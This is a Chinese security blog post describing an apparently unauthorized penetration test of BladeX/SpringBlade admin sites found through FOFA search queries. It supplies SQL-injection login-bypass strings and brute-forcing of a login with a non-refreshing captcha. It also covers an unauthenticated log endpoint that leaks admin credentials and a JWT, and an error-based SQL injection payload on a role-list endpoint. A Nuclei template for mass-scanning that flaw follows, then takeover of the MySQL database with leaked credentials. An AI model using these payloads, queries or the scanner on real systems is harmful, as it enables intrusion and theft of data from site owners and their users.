#  漏洞挖掘 | 记一次针对blade站点的渗透测试   
原创 zkaq - Tobisec  掌控安全EDU   2024-09-15 12:01  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 本文由掌控安全学院 -  Tobisec 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
## 0x1 前言  
### 浅谈  
  
哈喽，师傅们好！  
  
这篇文章呢，主要是我在微信公众号通过关注的一些大牛子师傅发的公众号，文章写的关于spring-blade后台框架系统的menu接口存在的1day漏洞，一些sql注入和未授权漏洞等，然后写了相关魔改后的blade的漏洞的打法，对blade比较感兴趣的我，也就开始踏上了blade漏洞挖掘的不归之路了！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMwGq6QTNUOpaI5BJhW28V34ibBJ6Y03NrayESlicWoU8gfGa5sTHqvuQw/640?wx_fmt=png&from=appmsg "")  
  
img  
### bladeX简介  
  
•**BladeX 物联网平台**是一款高度集成的物联网解决方案，涵盖设备管理、数据采集、实时监控、数据分析以及开放API服务等核心功能。  
  
•平台经过精心设计与开发，提供了全面的品类、产品和设备支持。设备注册成功后，能够轻松桥接至其他物联网云平台，实现设备的无缝集成。  
  
•同时提供服务端订阅功能，支持MQTT与AMQP两种方式将设备数据订阅转发至自建服务端，实现设备数据的自定义监控与分析。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygM67vQ9Hurrmm44sygN7J3YlHCdA9o5u7ftQGALrK7jpD8zuccH0qX5w/640?wx_fmt=png&from=appmsg "")  
  
img  
  
最主要的还是带师傅们了解下blade的登录界面了，要让师傅们一眼就认识这个系统框架，有助于我们在做渗透测试的时候快、准、狠拿下这些站点服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMCkWFO43YhPcZl3DGzQI1cEqaZL23UtY86PY9ZbMlVcUkIPoUOhHwxg/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 0x2 信息收集  
  
这次我的目标比较明确，就是主要打的就是blade的站点，所以我这里直接就可以使用空间引擎，比如国内常用的FOFA、鹰图、360Quake进行一个资产收集。  
### 1、通过icon图标检索  
  
对于新手师傅们可能开始对于blade不知道是什么框架系统，那么可以跟我下面一样，使用最简单的方法，直接在浏览器上检索bladex的icon图标，然后就可以看到下面的一把小铁剑了，这个就是经典的spring二次开发的blade的icon图标了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMFP6mycygm6ZUM8sYx5zNnxrqwxOg52sQFqABXXq0clXN5hjeplVvBg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
下面拿我们FOFA举例，利用这个icon图标进行一个检索  
```
icon_hash="1047841028"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMERlCibFGp0BAzd8W232fXYyhYiaHrHicRPcTjsicFQ5JdDuGnsE25IU45A/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
但是这次我主要是针对于这个blade的后台登录管理系统来的，所以这里再点击选择上面的后台管理系统，缩小我们的资产范围  
```
icon_hash="1047841028" && product="后台管理系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMKyTFicDl9vxC5Khn4atqpP7jibqSDicAknpGQRlqndL572Ok0fDSdsMog/640?wx_fmt=png&from=appmsg "null")  
  
img  
### 2、通过blade关键字  
  
下面是我总结的几个常用的空间检索引擎的语法，针对这几个相关漏洞的一个语法总结  
```
body="https://bladex.vip" && product="后台管理系统"
body="https://bladex.vip" && body="后台管理系统"
```  
#### FOFA  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMiaVcIicFNQ4Zl5GLr46PMZHUEcQQRzKfzuo5Zr2wDdawuLeibBxhKxjaQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
#### 鹰图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMSaIictANzOmZUZIQwCr47CpwJWNpFmtH7abvefpRc2n3O58ew8To25w/640?wx_fmt=png&from=appmsg "null")  
  
img  
#### 360Quake  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMRSNjsQC4Nvx7GckBrRPibtQH8QWhNgkZ3SlpVwvkDjtTXtGg9k6bmQg/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 0x3 渗透测试  
### 一、口令爆破  
  
通过上面的信息收集和资产的汇总，然后剩下的就是就这些站点进行一个测试了，我找的都是一些后台管理登录的，因为我想尝试使用弱口令登录或者如果没有验证码，使用口令爆破的方式登录进去，然后再进行一波系统内部的测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMONkyhQYcz31xwHsLSPEDZ2O9rKNuO1K8ByTrTllwrathBu7qJ2hib8g/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
这里使用wappalyzer插件看看这个登录站点的一个使用框架和开发语言的一个情况，可以看到Vue框架的，还有webpack打包，可能存在js.map文件泄露漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMiatICGk9jg7Y181aqibmb2nADL6XS3wWBFeUIBVQ184zDfGdTL8EuzZw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我这里先是测试了很多弱口令admin:123456/admin等等，但是都没有进去，然后我使用万能密码测试，看看能不能登录进行，但是这个站点没有成功。但是这个也是一个思路，可以在别的站点测试下，这个也给师傅们分享下汇总的一些sql注入万能密码  
```
admin'or 1=1--
admin'or' 1=1--
admin"or 1=1--
admin'or''='
admin'OR'1=1%00
admin'and'1'='1'#
admin'and'1'='1
admin'and'1'='1#
```  
  
就是这里的验证码，有一个bug就是不会刷新，账户密码输入错误，也不会刷新，那么我这里就想着直接尝试爆破，账户密码使用常见的top1000user和passwd进行爆破  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMlTbFx1MQtEQs1cP1BABGFf6XLOnsgJYrLGG8TNJQBFuktVoHRxZeFA/640?wx_fmt=png&from=appmsg "")  
  
img  
  
最后爆破的test1账户成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMjzxMxOaLLUF5rvbRXfDRX4DGZBBHWPIyRdK6qibwIyTbBlLbiaY6JXBw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
直接使用爆破成功的账户密码登录后台成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygM7cEdF2TAQPt33MqudrNlibns4Q3NCH99WuVJUwroeotlKFjbnhSPBzg/640?wx_fmt=png&from=appmsg "null")  
  
img  
### 二、垂直越权  
  
最开始进入后台，我就直接访问了个人信息这里，因为我一般喜欢进入后台，然后看看会不会有文件上传头像的这个功能点，我喜欢打文件上传，然后getshell的操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygM8nUVcIrBM0jQjTbtwYQFjUKUXffw4tVsBHbhVFnOqFrej4h5iaUCRUA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
这里确实存在文件上传的功能点，但是这里一直显示服务器异常，然后一直上传不上去，所以后面就没有打文件上传这个功能点了  
  
然后我就想尝试下像一般blade的接口泄露，包括开始看见了Vue框架，所以我一般都有利用bp的抓历史包的功能，然后点击左边的功能点，然后再进行挨个看历史数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMpibahQ5g3ABxPtDia1sg6DqtZibYN5yjpdW6REu2e69csMdJn9A0qbESw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMQ9Qy2sNHTk30gAI5vicIUNYpHBqro0VBFibX9Z1W5aiafibhvIibj7MSW3g/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
像这样的带user参数的，特别是后面还跟page、size、number等参数的时候，需要特别关注，像这样的接口很容易有 未授权导致的敏感信息泄露  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygM6LxmfkgpomPoqvj6dmyLEeQuMzZlJkv7cNG05oriaemJet2v6zhm2Xg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
师傅们可以看到我这里直接把其余的参数给删掉了，通过拼接参数list，以一个测试账户低权限的用户直接访问到了管理员账户的敏感信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMlKm6uC5dr8jiaAPgib08PDVJj3WiaETUBULibicC1KMTeiaICztD0WMocgwA/640?wx_fmt=png&from=appmsg "null")  
  
img  
### 三、泄露管理员账户密码  
  
我这里通过大牛师傅发的微信公众号的blade的1day漏洞，然后找到的这个接口，然后泄露了改系统的日志信息，可以看到下面泄露了token，也就是blade的JWT硬编码漏洞了，感兴趣的师傅在跟着我挖这个漏洞的时候可以去尝试下  
```
/api/blade-log/api/list
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMShJB22h6ybFnzDlmw5FYIibImkTd9ClJdw8hu10RuXWwUY7iar2pUxTQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
师傅们可以看到在这个log日志泄露里面找到了admin超级管理员的账户密码，这让人很是开心啊  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMdwQicbIRsYicY6DQVFZRMLrYCiaFTj9eUSzmGqVOu42yfJXicBwtc8gzMA/640?wx_fmt=png&from=appmsg "null")  
  
img  
### 四、SQL注入漏洞  
  
这里也是一样的，直接多去翻翻web界面的功能点，然后尽可能多的去分析这个接口，，然后去尝试接口拼接和修改，有些接口的1day可能多被魔改了，我这个站点就是一个经典的案例  
  
公众号的1day的poc是下面的这个：  
```
/api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1
```  
  
但是师傅们可以看到，我这里访问直接显示401未授权，那么像师傅们一般遇到这样的可能就放弃了，那么师傅们有没有想过这个接口魔改呢？可能是开发人员进行的一个魔改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMnKek5dBLpOicn9wkgaRPSkbH825U4gKkRXLZtMD1icaNRVcKrtaj4kFw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
我这里就是花了很长的一个时间，进行挨个page?参数的后面进行拼接，然后得到的一个能够成功打sql注入漏洞打一个接口，很多公众号或者网上都没有公布，我这个算是一个新思路了  
```
/api/blade-system/role/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMwPNa6OHfibgL4h0kgVfp7IQ7Jcq16O2RI16uTGic1bSVNxtnNe7fZtHg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
针对这个最新的blade魔改的sql注入漏洞的接口路径，很多文章和公众号都进行了打码，所以我这里给师傅们分析下。  
  
下面也是给新手师傅一个福利了，给师傅们利用Nuclei写了一个批量检测sql注入漏洞的脚本：  
```
id: template-id
info:
  name: Template Name
  author: xxxx
  severity: info
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET /api/blade-system/role/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Te: trailers
        Connection: close
    matchers:
      - type: word
        part: body
        words:
          - 'XPATH syntax error:'
```  
### 五、通过Navicat拿下MySQL数据库  
  
上面不是通过未授权，然后拿下了admin超级管理员的账户密码嘛，那么这不进去利用一波，那多可惜啊，废话不多说直接上强度。  
  
这里直接使用刚才拿到的账户密码进行一个登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMjA0IN4tRiblhEDjaXo8NYs77gEbt31UQicOYRJcNPpP7gvxiatXQGwZOg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
然后也是跟上面一样，多点点功能页面，看看超级管理员比普通用户的能够看到的信息多了哪些部分  
  
然后在数据库管理里面看到了mysql、oracle、sqlserver等数据库服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMysslR21mic7KgtglWChZEHtgr4aI99bDWjDqrGaEsx7Scericicm4X8XA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
然后点击查看，直接看到了连接MySQL数据库的IP以及账户密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMjkCdLRI7ha3iaqxbqw06lTC29CcKTh6GiaZh4xcPQqtlia3nJQbDW1kQQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
有了IP和MySQL数据库的账户密码了，那么我们就可以使用Navicat工具进行连接，看看能不能连接成功，然后拿下改数据库  
  
可以看到，直接测试连接成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMXcC57ib20khxrRZOjKPCIn7zGDaBVssJ4q2Mk4xeg3tpzPZ19Exbmiag/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
该站点的所以数据库用户的账户密码以后别的信息全部都接管成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpG6HEufDXzWbdpoRT2YygMzrHJdVESDy96mXXJ3Rib1JgAaQ0AuLqLhFJYZf9k5WBDLwckfTDfPnw/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 0x4 总结  
  
这篇文章到这里就结束了，文章的思路写的很清晰，新手师傅们应该也是很有帮助的一篇文章了，这篇文章开始写的信息收集，针对于blade站点来讲很有帮助的，感兴趣blade站点的师傅们也是可以跟着我的思路去打一波。  
  
这篇文章写了改站点的好几个漏洞，然后给师傅们演示了这个blade的打法，一步一步的渗透测试过程，很细节，也是一篇蛮不错的文章了哈！  
  
希望这个文章，能够帮助到师傅们！  
```
```  
  
